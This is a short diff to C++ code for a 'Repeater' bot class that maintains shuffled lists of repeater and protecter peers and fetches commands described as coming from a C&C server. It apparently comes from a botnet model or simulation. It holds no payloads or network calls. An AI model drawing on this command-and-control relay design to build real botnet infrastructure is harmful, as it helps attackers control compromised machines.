@@ -52,10 +52,10 @@ Repeater::Repeater() : Bot()
  */
 std::vector< boost::shared_ptr< Bot > > Repeater::sub_rlist()
 {
-	if (m_rlist.empty()) {
+	/*if (m_rlist.empty()) {
 		//m_rlist = hardcoded_rlist();
 		m_rlist = Botnet::repeaters_list();
-	}
+	}*/
 	
 	// create a random permutation of RList
 	std::vector< boost::shared_ptr< Bot > > tmp_list = m_rlist;
@@ -77,10 +77,10 @@ std::vector< boost::shared_ptr< Bot > > Repeater::sub_rlist()
  */
 std::vector< boost::shared_ptr< Bot > > Repeater::sub_plist()
 {
-	if (m_plist.empty()) {
+	/*if (m_plist.empty()) {
 		//m_plist = hardcoded_plist();
 		m_plist = Botnet::protecters_list();
-	}
+	}*/
 	
 	// create a random permutation of PList
 	std::vector< boost::shared_ptr< Bot > > tmp_list = m_plist;
@@ -99,10 +99,10 @@ std::vector< boost::shared_ptr< Bot > > Repeater::sub_plist()
  */
 void Repeater::update_rlist()
 {
-	if (m_rlist.empty()) {
+	/*if (m_rlist.empty()) {
 		//m_rlist = hardcoded_rlist();
 		m_rlist = Botnet::repeaters_list();
-	}
+	}*/
 	
 	// takes a random repeater from rlist
 	boost::shared_ptr<Bot> repeater_target;
@@ -128,10 +128,10 @@ void Repeater::update_rlist()
  */
 void Repeater::update_plist()
 {
-	if (m_plist.empty()) {
+	/*if (m_plist.empty()) {
 		//m_plist = hardcoded_plist();
 		m_plist = Botnet::protecters_list();
-	}
+	}*/
 	
 	// takes a random repeater from rlist
 	boost::shared_ptr< Bot > repeater_target;
@@ -155,10 +155,9 @@ void Repeater::update_plist()
 /*
  * get command from C&C server
  */
-std::string Repeater::get_control_command()
+unsigned int Repeater::get_control_command()
 {
-	std::string command("blahblah");
-	return command;
+	return COMMAND_FROM_REPEATER;
 }
 
 
@@ -167,6 +166,9 @@ std::string Repeater::get_control_command()
  */
 void Repeater::execute()
 {
+	m_plist = Botnet::protecters_list();
+	m_rlist = Botnet::repeaters_list();
+	
 	while (true) {
 		update_rlist();
 		update_plist();
